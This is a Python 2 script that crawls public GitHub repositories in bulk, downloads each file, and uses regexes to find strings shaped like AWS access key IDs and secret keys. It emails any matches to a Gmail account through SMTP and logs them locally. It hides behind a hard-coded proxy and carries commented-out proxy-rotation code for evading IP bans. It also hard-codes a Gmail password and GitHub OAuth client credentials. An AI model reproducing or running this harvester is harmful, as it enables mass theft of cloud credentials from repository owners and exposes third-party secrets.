import requests
import json
import re
import smtplib

import time
from compiler.pycodegen import EXCEPT
from multiprocessing.dummy import Pool as ThreadPool 
bannedIps = []
xyz = 88750000
requests.adapters.DEFAULT_RETRIES = 1

def newpool(num):
    global xyz
    repos = []
    x = xyz - (num * 5000)
    pool = ThreadPool(num)
    xyzs = []
    i = 0
    y = num
    while i <= num:
        xyzs.append(xyz / y * i)
        i = i + 1
    i = 0
    while i <= y:
        repos.append('https://api.github.com/repositories?since=' + str(int(xyzs[i]) + 1))
        print str(int(xyzs[i]) + 1)
        i = i + 1
        #print i
    #print repos
    results = pool.map(getContrib, repos)
    
    #close the pool and wait for the work to finish 
    print 'waiting... xyz=' + str(xyz)
    pool.close() 
    pool.join()  
        
    #getContrib(repos, shake)  
def getBranches(url, shake):
    import urllib2
    global bannedIps
    import json
    #print url
    """page = requests.get('https://free-proxy-list.net/')
    webpage = html.fromstring(page.content)
    proxy = []
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    secure = webpage.xpath("//td[7]/text()")
    for proxyy in proxies:
        if secure[i] == 'yes':
            proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    proxy.append('198.100.158.142:3128')
    proxy.append('192.95.4.14:8080')
    proxy.append('167.114.23.80:8080')
    proxy.append('167.114.47.242:8080')
    proxy.append('158.69.31.45:3128')
    proxy.append('198.50.212.32:8799')
    proxy.append('149.56.147.46:80')
    proxy.append('144.217.31.225:3128')
    page = requests.get('https://hidemy.name/en/proxy-list/?type=s')
    webpage = html.fromstring(page.content)
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    
    for proxyy in proxies:
        proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    page = requests.get('https://www.socks-proxy.net/')
    webpage = html.fromstring(page.content)
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    secure = webpage.xpath("//td[7]/text()")
    
    for proxyy in proxies:
        if secure[i] == 'yes':
            proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    from random import randint
    from random import seed
    import random
    import uuid
    rand = numpy.random.randint(0, len(proxy))
    #print rand
    #print proxy[rand]
    """
    done = False
    while done == False:
        #if 'https://' + proxy[rand] not in bannedIps:
        proxyDict = { 
                  #'https':'https://' + proxy[rand]
                  'https':'https://168.235.64.108:8081'
                }
        done = True
    #print proxyDict
    try:
        time.sleep(0.5)

        #req = requests.get(url, proxies=proxyDict)
        req = requests.get(url + "?" + shake, proxies=proxyDict, timeout = 40)
        print url
        json = json.loads(req.content)
        for item in json:
             print item['name']
             try:
                 f = open("logs.txt", "a+b")
                 f.write(item['name'] + "\n")
                 f.close()

                 print item['name']
                 getUrl(url[:-8]+ 'contents/?ref=' + item['name'], shake)
             except Exception as e:
                 f = open("logs.txt", "a+b")
                 f.write('getBranch: ' + str(e) + ': ' + req.content +'\n')
                 f.close()
                 print 'getBranch: ' + str(e) + ': ' + req.content
                 getBranches(url, shake)
    except Exception as e:
        print e
        getBranches(url, shake)
    #print req.content
    
def getUrl(url, shake):
    import urllib2
    global bannedIps
    import json
    #print url
    """
    page = requests.get('https://free-proxy-list.net/')
    webpage = html.fromstring(page.content)
    proxy = []
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    secure = webpage.xpath("//td[7]/text()")
    for proxyy in proxies:
        if secure[i] == 'yes':
            proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    proxy.append('198.100.158.142:3128')
    proxy.append('192.95.4.14:8080')
    proxy.append('167.114.23.80:8080')
    proxy.append('167.114.47.242:8080')
    proxy.append('158.69.31.45:3128')
    proxy.append('198.50.212.32:8799')
    proxy.append('149.56.147.46:80')
    proxy.append('144.217.31.225:3128')
    page = requests.get('https://hidemy.name/en/proxy-list/?type=s')
    webpage = html.fromstring(page.content)
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpatfh("//tbody/tr/td[2]/text()")
    
    for proxyy in proxies:
        proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    page = requests.get('https://www.socks-proxy.net/')
    webpage = html.fromstring(page.content)
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    secure = webpage.xpath("//td[7]/text()")
    
    for proxyy in proxies:
        if secure[i] == 'yes':
            proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    from random import randint
    from random import seed
    import random
    import uuid
    rand = numpy.random.randint(0, len(proxy))
    #print rand
    #print proxy[rand]
    """
    done = False
    while done == False:
        #if 'https://' + proxy[rand] not in bannedIps:
       proxyDict = { 
                  #'https':'https://' + proxy[rand]
                  'https':'https://168.235.64.108:8081'
                }
       done = True
    #print proxyDict
    try:
        print url
        #req = requests.get(url, proxies=proxyDict)
        time.sleep(0.5)
        req = requests.get(url + "&" + shake, proxies=proxyDict, timeout = 40)
        f = open("logs.txt", "a+b")
        f.write(url + "&" + shake + '\n')
        f.close()
        print url + "&" + shake
        json = json.loads(req.content)
        for item in json:
            #time.sleep(.8)
            try:
                 for attribute, value in item.iteritems():
                    if attribute == 'type':
                        if value == 'dir':
                            f = open("logs.txt", "a+b")
                            f.write('dir: ' + item['name'] + '\n')
                            f.close()
                            print 'dir: ' + item['name']
                            #print attribute, value # example usage
                            if url.split("?ref=",1)[1]:
                                contentsDir = url.split("/?ref=",1)[0] + '/' + item['name'] + '/?ref=' + url.split("?ref=",1)[1] 
                            else:
                                contentsDir = url + '/' + item['name'] 
                            getUrl(contentsDir, shake)
                        elif value == 'file':
                           f = open("logs.txt", "a+b")
                           f.write(item['download_url'] + '\n')
                           f.close()
                           print item['download_url']
                           #content2 = requests.get(item['download_url'], proxies=proxyDict).content
                           content2 = requests.get(item['download_url']).content
                           id = re.search(r'(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])', content2)
                           #if (id):
                           #    print "id: " + id.group()
                           #print 'searching...'
                           key = re.search(r'(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])', content2)
                           if (key):
                               if (id):
                                    msg = "\r\n".join([
                                      "From: jarettrsdunn@gmail.com",
                                      "To: jarettrsdunn@gmail.com",
                                      "Subject: new match",
                                      "",
                                      "id: " + id.group() + "\nkey: " + key.group() + '\n\n'
                                      ])
                                    username = 'jarettrsdunn@gmail.com'
                                    password = 'fooledyah'
                                    server = smtplib.SMTP('smtp.gmail.com:587')
                                    server.ehlo()
                                    server.starttls()
                                    fromaddr = "jarettrsdunn@gmail.com"
                                    toaddrs = ["jarettrsdunn@gmail.com"]
                                    server.login(username,password)
                                    server.sendmail(fromaddr, toaddrs, msg)
                                    server.quit()
                                    f = open("output.txt", "a+b")
                                    f.write("id: " + id.group() + "\nkey: " + key.group() + '\n\n')
                                    f.close()
                                    print "id: " + id.group() + "key: " + key.group()
            except Exception as e:
                 f = open("logs.txt", "a+b")
                 f.write('geturl: url=' + url + ' : ' + str(e) + ': ' + req.content + '\n')
                 f.close()
                 if 'good news' in req.content:
                     print 'goodnews, geturl: url=' + url + ' : ' + str(e) + ': ' + req.content

                     getUrl(url, shake)
                 else:
                     print 'geturl: url=' + url + ' : ' + str(e) + ': ' + req.content

    except Exception as e:
        
        #bannedIps.append(proxyDict['https'])
        #print bannedIps
        f = open("logs.txt", "a+b")
        f.write('exception ip: ' + str(proxyDict) + ' & geturl: ' + str(e) + '\n')
        f.close()
        print 'exception ip: ' + str(proxyDict) + ' & geturl: ' + str(e)
        getUrl(url, shake)
    #print req.content
    
def getContrib(url):
    global bannedIps
    print 'start...'
    shake = 'client_id=e3e911583253bb372cf1&client_secret=ee07a00c62b08be09ce29db876865af37ec5c1d1'

    import urllib2

    import json
    #print url
    """
    page = requests.get('https://free-proxy-list.net/')
    webpage = html.fromstring(page.content)
    proxy = []
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    secure = webpage.xpath("//td[7]/text()")
    
    for proxyy in proxies:
        if secure[i] == 'yes':
            proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    page = requests.get('https://hidemy.name/en/proxy-list/?type=s')
    webpage = html.fromstring(page.content)
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    
    for proxyy in proxies:
        proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    
    page = requests.get('https://www.socks-proxy.net/')
    webpage = html.fromstring(page.content)
    i = 0
    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
    ports = webpage.xpath("//tbody/tr/td[2]/text()")
    secure = webpage.xpath("//td[7]/text()")
    
    for proxyy in proxies:
        if secure[i] == 'yes':
            proxy.append((proxyy) + ":" + (ports[i]))
        #print proxy[i]
        i = i + 1
    proxy.append('198.100.158.142:3128')
    proxy.append('192.95.4.14:8080')
    proxy.append('167.114.23.80:8080')
    proxy.append('167.114.47.242:8080')
    proxy.append('158.69.31.45:3128')
    proxy.append('198.50.212.32:8799')
    proxy.append('149.56.147.46:80')
    proxy.append('144.217.31.225:3128')
    
    from random import randint
    from random import seed
    import random
    import uuid
    rand = numpy.random.randint(0, len(proxy))
    #print rand
    #print proxy[rand]
    """
    done = False
    while done == False:
        #if 'https://' + proxy[rand] not in bannedIps:
       proxyDict = { 
                  #'https':'https://' + proxy[rand]
                  'https':'https://168.235.64.108:8081'
                }
       done = True
    #print proxyDict
    try:
        print url
        #req = requests.get(url, proxies=proxyDict)
        #rand = numpy.random.randint(1, 11)
        from random import randint
        time.sleep(randint(1, 16))
        req = requests.get(url + "&" + shake, proxies=proxyDict, timeout = 40)
        json = json.loads(req.content)
        #print req.content
        first = True
        #for item in json:
        print str(json[0]['id']) + ": " + str(json[0]['full_name'])
        #print item['id']
        if first == True:
            #print item['id']
            first = False
        branches = 'https://api.github.com/repos/' + json[0]['full_name'] + '/branches'
        
        #print contents
        id = json[0]['id']
        for line in open('ids.txt').readlines():
              found = False
              #print line
              if line.startswith(str(id)):
                  found = True
                  print 'found id already friend'
                  break
        if not found:
                  
            getBranches(branches, shake)
            f = open("ids.txt", "a+b")
            f.write(str(id) + "\n")
            f.close()
            #print id
        repos = 'https://api.github.com/repositories?since=' + str(id)
        print str(id) 
        getContrib(repos) 
    except Exception as e:
        print e
        getContrib(url)
    print 'DONE!'
    repos = []
    newpool(1)
    #print req.content
   


newpool(25)              
